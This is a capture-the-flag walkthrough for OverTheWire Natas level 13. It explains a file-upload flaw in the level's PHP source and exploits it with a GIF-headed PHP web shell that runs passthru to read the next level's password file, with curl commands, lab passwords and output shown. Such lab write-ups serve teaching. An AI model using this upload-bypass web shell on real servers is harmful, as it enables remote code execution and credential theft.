### natas13 pswd: g8ba0olAzaSJuyS4gnmbdVVigAICLG1k

```bash
curl  -s -X POST http://natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k@natas13.natas.labs.overthewire.org                                           

# <html>
# <body>
# <h1>natas13</h1>
# <div id="content">
# For security reasons, we now only accept image files!<br/><br/>
# 
# 
# <form enctype="multipart/form-data" action="index.php" method="POST">
# <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
# <input type="hidden" name="filename" value="dzcijtndz6.jpg" />
# Choose a JPEG to upload (max 1KB):<br/>
# <input name="uploadedfile" type="file" /><br />
# <input type="submit" value="Upload File" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>

```

Getting the php source-code:

```bash
curl  -s -X POST http://natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k@natas13.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html

# <html>
# <body>
# <h1>natas13</h1>
# <div id="content">
# For security reasons, we now only accept image files!<br/><br/>
# 
# <?php
# 
# function genRandomString() {
#     $length = 10;
#     $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
#     $string = "";
# 
#     for ($p = 0; $p < $length; $p++) {
#         $string .= $characters[mt_rand(0, strlen($characters)-1)];
#     }
# 
#     return $string;
# }
# 
# function makeRandomPath($dir, $ext) {
#     do {
#     $path = $dir."/".genRandomString().".".$ext;
#     } while(file_exists($path));
#     return $path;
# }
# 
# function makeRandomPathFromFilename($dir, $fn) {
#     $ext = pathinfo($fn, PATHINFO_EXTENSION);
#     return makeRandomPath($dir, $ext);
# }
# 
# if(array_key_exists("filename", $_POST)) {
#     $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
# 
#     $err=$_FILES['uploadedfile']['error'];
#     if($err){
#         if($err === 2){
#             echo "The uploaded file exceeds MAX_FILE_SIZE";
#         } else{
#             echo "Something went wrong :/";
#         }
#     } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
#         echo "File is too big";
#     } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
#         echo "File is not an image";
#     } else {
#         if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path
# )) {
#             echo "The file <a href=\"$target_path\">$target_path</a>
#  has been uploaded";
#         } else{
#             echo "There was an error uploading the file, please try again!";
#         }
#     }
# } else {
# ?>
# 
# <form enctype="multipart/form-data" action="index.php" method="POST">
# <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
# <input type="hidden" name="filename" value="<?php print genRandomString(); ?>
# .jpg" />
# Choose a JPEG to upload (max 1KB):<br/>
# <input name="uploadedfile" type="file" /><br />
# <input type="submit" value="Upload File" />
# </form>
# <?php } ?>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

The php code with comments:

```php
<html>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?php

// ---------------------------------------------
// 1. HELPER FUNCTIONS to randomize the uploaded filename
// ---------------------------------------------

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

// STILL VULNERABLE: 
// It still extracts the extension from whatever string we provide, not from the actual file.
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

// ---------------------------------------------
// MAIN SCRIPT EXECUTION
// ---------------------------------------------

if(array_key_exists("filename", $_POST)) {
    // Generates the save path, trusting our $_POST["filename"] for the extension (.php)
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    // 2. NEW ERROR HANDLING
    // Better error checking to tell the user what went wrong.
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        // Error code 2 means the file exceeded the HTML MAX_FILE_SIZE directive
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
        
    // ---------------------------------------------------------
    // 3. THE NEW SECURITY CHECK (and our attack vector)
    // ---------------------------------------------------------
    // The developer added `exif_imagetype()` to stop uploading of plain PHP files.
    //
    // `exif_imagetype` reads ONLY the first few bytes of the file (called 
    // "Magic Bytes" or "File Signatures") to see if it starts with standard image 
    // headers (e.g., GIF89a for GIFs, or \xFF\xD8\xFF for JPEGs).
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";

    } else {
        // If the file passes the size check and the image signature check, it saves it!
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<!-- 4. THE HTML FORM (Same as Natas 12) -->
<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<!-- We can still overwrite this hidden filename field to end in .php -->
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Our attack:
- we create a .php file that starts with `GIF89a`:
```bash
echo GIF89a > natas14psw.php
echo '<?php passthru("echo -n natas14:; cat /etc/natas_webpass/natas14"); ?>' >> natas14psw.php

cat natas14psw.php 
# GIF89a
# <?php passthru("echo -n natas14:; cat /etc/natas_webpass/natas14"); ?>

file natas14psw.php                                   
# natas14psw.php: GIF image data, version 89a, 15370 x 28735

```
- the webserver PHP engine ignores/returns anything outside of the `<?php ... ?>` tags 
and executes the code inside the php tags and returns the result of the code.
- uploading the fake gif image:

```bash
curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
-F "uploadedfile=@natas14psw.php" \
-F "filename=something.php" \
http://natas13.natas.labs.overthewire.org/index.php


# <html>
# <body>
# <h1>natas13</h1>
# <div id="content">
# For security reasons, we now only accept image files!<br/><br/>
# 
The file <a href="upload/5nyt9jg4s1.php">upload/5nyt9jg4s1.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>

```

Now we "view" the uploaded file:

```bash
curl -u natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k \
http://natas13.natas.labs.overthewire.org/upload/5nyt9jg4s1.php
# GIF89a
# natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
```
